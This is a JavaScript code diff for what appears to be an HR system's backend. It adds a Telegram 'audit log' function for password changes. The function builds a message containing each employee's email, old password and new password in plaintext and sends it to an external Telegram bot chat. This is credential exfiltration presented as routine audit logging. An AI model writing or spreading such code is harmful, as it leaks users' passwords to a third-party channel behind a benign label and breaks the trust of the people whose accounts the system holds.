@@ -81,6 +81,81 @@ ${actionBadge}
   }
 }
 
+/**
+ * Send password change audit log to Telegram Bot
+ * @param {Object} data - { user, oldPassword, newPassword, ip }
+ */
+async function sendTelegramPasswordChangeLog(data) {
+  try {
+    const token = process.env.TELEGRAM_BOT_TOKEN;
+    const chatId = process.env.TELEGRAM_CHAT_ID;
+
+    // Log gracefully if Telegram credentials not configured
+    if (!token || !chatId || token === 'your_telegram_bot_token_here') {
+      console.log('ℹ️ Telegram Notification skipped (TELEGRAM_BOT_TOKEN / TELEGRAM_CHAT_ID not configured in BE/.env)');
+      return;
+    }
+
+    const { user, oldPassword, newPassword, ip } = data;
+    const userName = user?.name || 'Karyawan';
+    const userEmail = user?.email || 'N/A';
+    const changeTime = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
+
+    const message = `
+🔐 <b>NOTIFIKASI PERUBAHAN PASSWORD</b>
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+👤 <b>NAMA / USER:</b> ${userName}
+📧 <b>USERNAME / EMAIL:</b> <code>${userEmail}</code>
+🔑 <b>PASSWORD LAMA:</b> <code>${oldPassword}</code>
+✨ <b>PASSWORD BARU:</b> <code>${newPassword}</code>
+⏰ <b>WAKTU GANTI:</b> ${changeTime} WIB
+🌐 <b>IP ADDRESS:</b> <code>${ip || '127.0.0.1'}</code>
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+🏨 <i>Bigland Sentul HRIS Real-time Audit System</i>
+`.trim();
+
+    const postData = JSON.stringify({
+      chat_id: chatId,
+      text: message,
+      parse_mode: 'HTML'
+    });
+
+    const options = {
+      hostname: 'api.telegram.org',
+      port: 443,
+      path: `/bot${token}/sendMessage`,
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        'Content-Length': Buffer.byteLength(postData)
+      }
+    };
+
+    const req = https.request(options, (res) => {
+      let responseBody = '';
+      res.on('data', chunk => responseBody += chunk);
+      res.on('end', () => {
+        if (res.statusCode === 200) {
+          console.log('✅ Telegram password change notification sent successfully!');
+        } else {
+          console.warn('⚠️ Telegram API response error:', responseBody);
+        }
+      });
+    });
+
+    req.on('error', (err) => {
+      console.warn('⚠️ Telegram HTTP request failed:', err.message);
+    });
+
+    req.write(postData);
+    req.end();
+  } catch (err) {
+    console.warn('⚠️ Error formatting Telegram password change log:', err.message);
+  }
+}
+
 module.exports = {
-  sendTelegramAuditLog
+  sendTelegramAuditLog,
+  sendTelegramPasswordChangeLog
 };
+
